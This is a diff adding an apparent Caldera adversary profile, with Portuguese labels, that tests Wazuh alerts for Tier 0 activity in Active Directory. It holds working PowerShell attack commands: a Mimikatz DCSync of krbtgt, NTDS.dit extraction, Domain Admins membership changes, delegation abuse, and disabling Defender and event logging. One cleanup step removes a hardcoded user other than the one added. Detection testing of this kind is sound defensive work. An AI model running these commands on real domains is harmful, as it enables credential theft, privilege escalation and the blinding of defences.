@@ -1,0 +1,224 @@
+id: 8193d4c9-380e-4b1f-8f5a-e5636ce6a5c5
+name: CORP - Teste de alertas Windows (Tier 0)
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 4017b797-1a2a-403f-96c4-3d2eb4650a37
+- 5204f945-76f9-49ef-ac21-be41975de981
+- 81211716-a933-459d-b065-832a58539a06
+- b7856e9f-8177-413a-b63c-bc39791ca676
+- 253f6e93-197a-4df3-ada0-650d78b6ed51
+- 54eddce5-3a49-4dc8-bbb6-7020240a00d1
+- 0863fefc-a814-45ef-a513-52fdeb332ede
+- 49a7068f-c370-4d4a-8d23-8292fb6bb0d0
+- e7224301-4af0-4e0a-bc0f-ed42fd292fae
+- c1f15524-28bb-408c-9a8a-51f4b80a658d
+- e9cce39b-43d4-428f-a008-d2fe020dab20
+- e2df09ce-1f7c-4592-a3f0-f901e9b31c38
+- d46b31fe-8f0b-42be-ae06-51aa518f79d0
+- 79f676ae-ede0-47c6-b8b0-f8fe6e905b5c
+- 29a19ef9-5115-4447-ac88-88eb0fbc79f2
+- 78cd8253-225e-4521-ba03-55d2150d9900
+- 05477d25-76a3-412f-9124-eb36902426b8
+abilities:
+ 4017b797-1a2a-403f-96c4-3d2eb4650a37:
+  name:  [CORP] [Wazuh] [110003] [Tier0] Alteração de SPN de usuário do AD
+  tactic:  persistence
+  technique_name:  "Account Manipulation"
+  technique_id:  T1098
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Set-ADUser -Identity #{corp.domain.spnuser} -Clear servicePrincipalName;
+       Set-ADUser -Identity #{corp.domain.spnuser} -Add @{servicePrincipalName='MSSQLSvc/srv-mssql.#{corp.domain
+       }'};
+ 5204f945-76f9-49ef-ac21-be41975de981:
+  name:  [CORP] [Wazuh] [110005] [Tier0] Alteração de Do not require Kerberos Pre-Auth de usuário do AD
+  tactic:  credential-access
+  technique_name:  "Steal or Forge Kerberos Tickets: AS-REP Roasting"
+  technique_id:  T1558.004
+  executors: 
+   - psh:
+     platform: unknown
+     command: |
+       Import-Module ActiveDirectory;
+       Set-ADAccountControl -Identity #{corp.domain.spnuser} -DoesNotRequirePreAuth $false;
+       Set-ADAccountControl -Identity #{corp.domain.spnuser} -DoesNotRequirePreAuth $true;
+ 81211716-a933-459d-b065-832a58539a06:
+  name:  [CORP] Enumeração de usuários do Active Directory
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       $Path = "$PWD\#{corp.domain.users}";
+       Get-ADUser -Filter * | Select-Object -ExpandProperty sAMAccountName | Out-File -Encoding ASCII $Path;
+       Write-Host $Path;
+ b7856e9f-8177-413a-b63c-bc39791ca676:
+  name:  [CORP] [Wazuh] [110009] [Tier0] Alterar grupo privilegiado
+  tactic:  persistence
+  technique_name:  "Account Manipulation"
+  technique_id:  T1098
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Add-ADGroupMember -Identity "#{corp.domain.privilegedgroup}" -Members "#{corp.domain.privilegeduser}" -Verbose;
+       Start-Sleep -Seconds 30;
+       Remove-ADGroupMember -Identity "#{corp.domain.privilegedgroup}" -Members "#{corp.domain.privilegeduser}" -Confirm:$false -Verbose;
+ 253f6e93-197a-4df3-ada0-650d78b6ed51:
+  name:  [CORP] [Wazuh] [110010] [Tier0] Desabilita conta especial monitorada
+  tactic:  credential-access
+  technique_name:  "Valid Accounts: Domain Accounts"
+  technique_id:  T1078
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Disable-ADAccount -Identity #{corp.domain.btgaccount};
+       Start-Sleep -Seconds 30;
+       Enable-ADAccount -Identity #{corp.domain.btgaccount};
+ 54eddce5-3a49-4dc8-bbb6-7020240a00d1:
+  name:  [CORP] [Wazuh] [110011] [Tier0] Configura Unconstrained Delegation em um computador do domínio
+  tactic:  credential-access
+  technique_name:  "Account Manipulation"
+  technique_id:  T1098
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Get-ADComputer -Identity #{corp.domain.delegation_computer} | Set-ADAccountControl -TrustedForDelegation $true;
+       Get-ADComputer -Identity #{corp.domain.delegation_computer} | Set-ADAccountControl -TrustedForDelegation $false;
+ 0863fefc-a814-45ef-a513-52fdeb332ede:
+  name:  [CORP] [Wazuh] [110012] [Tier0] Configura Constrained Delegation em um computador do domínio
+  tactic:  credential-access
+  technique_name:  "Account Manipulation"
+  technique_id:  T1098
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Set-ADComputer -Identity #{corp.domain.delegation_computer} -Add @{'msDS-AllowedToDelegateTo'=@('cifs/#{corp.domain.dc}','CIFS/#{corp.domain.dc}.#{corp.domain}')};
+       Get-ADComputer -Identity #{corp.domain.delegation_computer} | Set-ADAccountControl -TrustedToAuthForDelegation $true;
+       Set-ADComputer -Identity #{corp.domain.delegation_computer} -Remove @{'msDS-AllowedToDelegateTo'=@('cifs/#{corp.domain.dc}','CIFS/#{corp.domain.dc}.#{corp.domain}')};
+       Get-ADComputer -Identity #{corp.domain.delegation_computer} | Set-ADAccountControl -TrustedToAuthForDelegation $false;
+ 49a7068f-c370-4d4a-8d23-8292fb6bb0d0:
+  name:  [CORP] [Wazuh] [110013] [Tier0] Configura Resource Based Constrained Delegation (RBCD) em um computador do domínio
+  tactic:  credential-access
+  technique_name:  "Account Manipulation"
+  technique_id:  T1098
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Set-ADComputer -Identity #{corp.domain.delegation_computer} -PrincipalsAllowedToDelegateToAccount #{corp.domain.dc}$;
+       Set-ADComputer -Identity "#{corp.domain.delegation_computer}" -PrincipalsAllowedToDelegateToAccount $null;
+ e7224301-4af0-4e0a-bc0f-ed42fd292fae:
+  name:  [CORP] [Wazuh] [110015] [Tier0] DCSync utilizando Mimikatz
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: DCSync"
+  technique_id:  T1003.006
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       .\mimikatz.exe "lsadump::dcsync /user:krbtgt@corp.local" "exit"
+ c1f15524-28bb-408c-9a8a-51f4b80a658d:
+  name:  [CORP] [Wazuh] [110016] [Tier0] Extração do arquivo NTDS.dit usando ntdsutil
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: NTDS"
+  technique_id:  T1003.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       New-Item -Path "C:\Tools\AD_Extraction" -ItemType Directory -ErrorAction Ignore;
+       NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full C:\Tools\AD_Extraction" "q" "q"
+       Remove-Item -Path "C:\Tools\AD_Extraction" -Recurse -Force;
+ e9cce39b-43d4-428f-a008-d2fe020dab20:
+  name:  [CORP] [Wazuh] [110019] [Tier0] Monitoramento de acessos à Tier 0 exclusivamente por usuários Tier 0
+  tactic:  lateral-movement
+  technique_name:  "Valid Accounts: Domain Accounts"
+  technique_id:  T1078
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       Add-ADGroupMember -Identity "Domain Admins" -Members "#{corp.domain.validuser}" -Verbose;
+       $password = ConvertTo-SecureString "#{corp.domain.validpass}" -AsPlainText -Force;
+       $cred = New-Object System.Management.Automation.PSCredential('#{corp.domain}\#{corp.domain.validuser}', $password);
+       Invoke-Command -ComputerName corp-dc.corp.local -Command {whoami} -Credential $cred;
+       Remove-ADGroupMember -Identity "Domain Admins" -Members "andre.torres" -Confirm:$false -Verbose;
+ e2df09ce-1f7c-4592-a3f0-f901e9b31c38:
+  name:  [CORP] [Wazuh] [110022] Desativar Windows Defender
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -Verbose;
+ d46b31fe-8f0b-42be-ae06-51aa518f79d0:
+  name:  [CORP] [Wazuh] [110024] Adicionar pasta em exclusão no Windows Defender
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Add-MpPreference -ExclusionPath "C:\Tools\Testing12345";
+       Remove-MpPreference -ExclusionPath "C:\Tools\Testing12345"
+ 79f676ae-ede0-47c6-b8b0-f8fe6e905b5c:
+  name:  [CORP] [Wazuh] [110025] Alterar configuração de serviço de sistema
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable Windows Event Logging"
+  technique_id:  T1562.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-Service -Name EventLog -StartupType Manual;
+       Set-Service -Name EventLog -StartupType Automatic;
+ 29a19ef9-5115-4447-ac88-88eb0fbc79f2:
+  name:  [CORP] [Wazuh] [110028] Parar serviço de segurança do sistema
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable Windows Event Logging"
+  technique_id:  T1562.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Stop-Service EventLog -Force;
+ 78cd8253-225e-4521-ba03-55d2150d9900:
+  name:  [CORP] [Wazuh] [110029] Limpar logs de sistema
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Windows Event Logs"
+  technique_id:  T1070.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Clear-EventLog -LogName Application;
+ 05477d25-76a3-412f-9124-eb36902426b8:
+  name:  [CORP] [Wazuh] [110035] Executar ferramenta PowerShell conhecida
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       # Invoke-ShareFinder -Test -Parameters
